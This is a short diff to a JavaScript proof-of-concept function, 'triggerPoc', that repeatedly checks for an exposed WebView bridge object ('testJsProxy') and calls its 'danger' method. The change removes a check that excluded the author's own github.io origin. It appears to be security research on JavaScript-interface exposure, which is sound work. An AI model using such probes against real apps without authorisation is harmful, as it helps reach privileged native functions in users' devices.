@@ -3,7 +3,7 @@
   function triggerPoc(url){
     for(let i=0; i<1000; i++){
       setTimeout(function(){
-      if(window.testJsProxy && typeof window.testJsProxy.danger === "function" && !location.href.startsWith("https://renfromabove.github.io")){
+      if(window.testJsProxy && typeof window.testJsProxy.danger === "function"){
         console.log(location.href+" get the api "+ window.testJsProxy.danger());
       }},i)
     }
